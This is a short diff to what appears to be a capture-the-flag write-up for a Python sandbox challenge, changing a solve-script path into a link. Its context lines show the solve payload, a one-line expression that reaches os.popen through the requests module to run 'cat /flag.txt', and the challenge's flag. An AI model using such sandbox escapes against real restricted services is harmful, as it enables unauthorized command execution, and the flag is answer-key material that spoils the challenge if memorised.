@@ -47,7 +47,7 @@ import requests; print(requests.utils.os.popen("cat /flag.txt").read())
 (A single line because `input()` only reads one line; `;` to continue.)
 
 ## Solve script
-Script path: `scripts/solve.py`
+Script path: [scripts/solve.py](scripts/solve.py)
 
 ## Flag
 sigpwny{more_like_unrestricted_python_lmao}
